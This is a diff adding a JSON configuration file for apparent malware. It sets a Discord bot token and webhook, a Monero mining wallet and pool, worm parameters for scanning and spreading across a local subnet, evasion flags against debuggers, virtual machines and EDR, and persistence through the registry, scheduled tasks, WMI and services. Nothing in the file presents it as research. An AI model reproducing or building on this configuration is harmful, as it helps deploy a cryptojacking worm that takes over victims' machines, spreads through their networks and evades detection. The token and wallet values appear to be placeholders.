@@ -1,0 +1,28 @@
+{
+    "discord": {
+        "bot_token": "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.GpLw7l.j-6wXB5jLkHk3Q7R2sYwX8nQ4w0",
+        "channel_id": "123456789012345678",
+        "webhook_url": "https://discord.com/api/webhooks/1234567890/abcdefg"
+    },
+    "mining": {
+        "wallet": "46EsRkz4sQm1FwXfpEVU8F1S5eZ1KJ5w7P1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1R2S3T4U5V6W7X8Y9Z0A1B2C3D4E5F6G7H8I9",
+        "pool": "pool.supportxmr.com:3333",
+        "threads": 4
+    },
+    "worm": {
+        "subnet": "192.168.1.0",
+        "max_threads": 50,
+        "scan_interval": 300,
+        "propagate_interval": 60
+    },
+    "evasion": {
+        "level": "high",
+        "anti_debug": true,
+        "anti_vm": true,
+        "anti_edr": true
+    },
+    "persistence": {
+        "methods": ["registry", "tasks", "wmi", "services"],
+        "verification": true
+    }
+}
